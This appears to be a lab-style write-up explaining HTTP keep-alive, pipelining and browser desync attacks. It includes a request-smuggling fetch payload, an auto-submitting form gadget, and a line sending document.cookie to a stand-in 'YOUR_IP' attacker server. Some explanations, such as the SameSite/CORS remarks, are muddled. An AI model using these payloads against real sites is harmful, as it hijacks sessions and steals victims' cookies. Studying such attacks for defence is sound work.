#### HTTP Keep-Alive  

HTTP keep-alive is a mechanism that allows the reuse of a single TCP connection for multiple HTTP requests and responses. It helps reduce latency and improve performance by avoiding the need to open and close connections repeatedly. However, it can introduce a security risk known as Cache Poisoning. If caching mechanisms are in place, the persistence of connections through keep-alive could contribute to cache poisoning attacks. An attacker might exploit desynchronization issues to store malicious content in caches.
#### HTTP Pipelining

Usually, with HTTP, one request results in one response. If the HTTP pipelining is enabled in the backend server, it will allow the simultaneous sending of two requests with the corresponding responses without waiting for each response. The only way to differentiate between two requests and a big one is by using the Content-Length header, which specifies the length in bytes of each request. The content header is an unnecessary header for most static file contents in a web application, like images or icons, since the backend server will usually not consider it.
## Browser Desync
In a Browser Desync attack, the attacker aims to take control of a victim's account by exploiting vulnerabilities in a web application's user connection system.
This attack occurs in two steps:
1.  The initial request, appearing legitimate, is intended to disrupt the user request queue by introducing an arbitrary request. 
2. Once the connection pool is compromised, the very next valid request will be replaced by the arbitrary request initiated in the previous step.
#### HTTP Browser Desync Identification
To execute the attack, a straightforward approach is to utilize the `fetch` JavaScript function. This function allows for maintaining the connection ID across requests. The connection ID refers to a unique identifier assigned to a network connection between the client (browser) and the server. This identifier helps the server keep track of multiple connections and distinguish between them.
This consistent connection ID lies in its ability to facilitate exploitation for an attacker that could expose user information or session tokens such as cookies.
Moreover, in a cross-site attack, the browser shares user cookies based on how the `SameSite` flag is set (CORS), but this security rule doesn't apply if the current domain matches the remote one, as in Browser Desync attacks. In such cases, there's no restriction. 

You can hack your session by using the following payload from your browser command line.
```javascript
fetch('http://10.10.227.23:5000/', 
	{
		method: 'POST', 
		body: 'GET /redirect HTTP/1.1\r\nFoo: x',
		mode: 'cors',
	}
);
```
In the body, the flag `mode: 'cors'`, triggers an error when visiting the 404 web page and avoids following the redirect.

#### HTTP Browser Desync exploit chaining XSS
One potential attack vector involves replacing the following request with an arbitrary JavaScript file to execute custom code. However, this strategy necessitates the presence of an arbitrary file upload feature on the website.
Instead, we can use a rogue server to deliver an XSS attack to steal the cookie from the victim.   

We can use the following gadget and deliver it to abuse any component of the web application that allows to reflect text and probably be visited by a user:
```html
<form id="btn" action="http://challenge.com/"
    method="POST"
    enctype="text/plain">
<textarea name="GET http://YOUR_IP HTTP/1.1
AAA: A">placeholder1</textarea>
<button type="submit">placeholder2</button>
</form>
<script> btn.submit() </script>
```
We utilize a form because it inherently supports a keep-alive connection by default. The type is used to avoid the default encoding MIME type since we don't want to encode the second malicious request.  
Furthermore, the textarea's name attribute will overwrite the bytes of the following request, enabling redirection to our rogue server.  
To summarize, this gadget operates by using the initial request to position the victim within the connection context of the vulnerable server. The following request retrieves the malicious payload, compromising the victim's session.  
  

To do so, we can set up a rogue server by serving a route with a malicious payload like `fetch('http://YOUR_IP/' + document.cookie);`